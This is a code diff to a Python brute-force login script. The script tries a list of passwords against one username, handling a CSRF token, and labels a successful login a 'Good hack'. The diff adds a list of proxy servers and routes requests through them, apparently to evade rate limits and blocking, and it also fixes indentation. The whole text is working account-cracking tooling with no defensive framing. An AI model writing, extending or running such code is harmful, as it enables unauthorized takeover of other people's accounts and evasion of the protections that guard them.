@@ -79,12 +79,20 @@ def main():
     passwords_file = input("List of Passwords => ")
     passwords = read_passwords(passwords_file)
     
+    proxies = [
+        'http://proxy1.example.com:port',
+        'http://proxy2.example.com:port',
+        # Add more proxies if needed
+    ]
+    
     with requests.Session() as session:
         csrf_token = get_csrf_token(session)
         if not csrf_token:
             print("CSRFTOKEN not found in cookies")
             return
         for password in passwords:
+            proxy = {'http': proxies[0]}  # Use the first proxy from the list
+            session.proxies = proxy
             response = attempt_login(session, username, password, csrf_token)
             if 'checkpoint_url' in response.text:
                 print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
@@ -98,10 +106,10 @@ def main():
             if 'error' in response.text:
                 print((normal_color+'' + ' --> Username : ' + end_banner_color + username + red_color + ' --> Password : ' + end_banner_color + password + red_color + ' --> Sorry, there was a problem'))
             elif 'status' in response.text:
-              print (end_banner_color + "---------------------------------------")
-              print ((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))
-              print('\nSleeping for 10 seconds...')
-              sleep(10)
+                print (end_banner_color + "---------------------------------------")
+                print ((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))
+                print('\nSleeping for 10 seconds...')
+                sleep(10)
 
 if __name__ == "__main__":
     main()
